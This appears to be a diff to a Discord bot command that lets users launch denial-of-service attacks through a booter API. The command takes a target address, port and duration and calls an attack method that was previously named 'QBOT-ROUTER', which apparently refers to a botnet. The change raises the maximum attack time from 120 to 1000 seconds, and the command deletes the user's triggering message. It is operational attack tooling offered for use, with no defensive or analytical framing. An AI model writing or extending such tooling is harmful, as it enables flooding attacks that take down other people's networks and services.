@@ -58,7 +58,7 @@ module.exports = {
           .setColor(0xff1100)
           .setTimestamp()
           .setFooter(message.author.tag, message.member.user.displayAvatarURL())
-        ).then(msg => msg.delete({ timeout: 20000 }));
+        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))
 
 
         /* checking if the port is a number and not a letter */
@@ -67,7 +67,7 @@ module.exports = {
           .setColor(0xff1100)
           .setTimestamp()
           .setFooter(message.author.tag, message.member.user.displayAvatarURL())
-        ).then(msg => msg.delete({ timeout: 20000 }));
+        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))
 
         /* checking if the port is a number and not a letter */
         if (isNaN(time)) return message.channel.send(new MessageEmbed()
@@ -75,21 +75,21 @@ module.exports = {
           .setColor(0xff1100)
           .setTimestamp()
           .setFooter(message.author.tag, message.member.user.displayAvatarURL())
-        ).then(msg => msg.delete({ timeout: 20000 }));
+        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))
 
         /* checking the max time */
-        if (time < 10 || time > 120) return message.channel.send(new MessageEmbed()
-          .setTitle("❌ Error | **Max Time \`[10 - 120]\` **")
+        if (time < 10 || time > 1000) return message.channel.send(new MessageEmbed()
+          .setTitle("❌ Error | **Max Time \`[10 - 1000]\` **")
           .setColor(0xff1100)
           .setTimestamp()
           .setFooter(message.author.tag, message.member.user.displayAvatarURL())
-        ).then(msg => msg.delete({ timeout: 20000 }));
+        ).then(msg => msg.delete({ timeout: 10000 }).catch(e => console.log(e.message)))
 
         /* checking the deletes the message after it get's sent  */
         await message.delete()
 
         /* sends the attack with embed */
-        await util.requestAPI(address, port, time, 'QBOT-ROUTER');
+        await util.requestAPI(address, port, time, 'ROUTER');
         return message.channel.send(new MessageEmbed()
           .setThumbnail(client.user.displayAvatarURL())
           .setColor(0xff1100)
